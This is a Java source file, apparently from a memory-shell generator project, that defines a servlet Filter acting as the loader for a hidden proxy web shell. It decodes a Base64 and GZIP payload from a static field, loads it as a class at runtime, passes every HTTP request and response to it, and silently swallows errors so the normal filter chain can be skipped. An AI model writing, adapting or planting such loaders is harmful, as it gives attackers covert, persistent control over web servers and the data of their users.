package com.reajason.javaweb.memshell.shelltool.proxy;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

public class ProxyFilter extends ClassLoader implements Filter {
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;

    public ProxyFilter() {
    }

    protected ProxyFilter(ClassLoader parent) {
        super(parent);
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        if (request instanceof HttpServletRequest) {
            try {
                if (getProxyHttpClass().newInstance().equals(new Object[]{request, response})) {
                    return;
                }
            } catch (Throwable ignored) {
            }
        }
        chain.doFilter(request, response);
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyFilter.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = new ProxyFilter(Thread.currentThread().getContextClassLoader())
                            .defineClass(bytes, 0, bytes.length);
                }
            }
        }
        return proxyHttpClass;
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Throwable e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
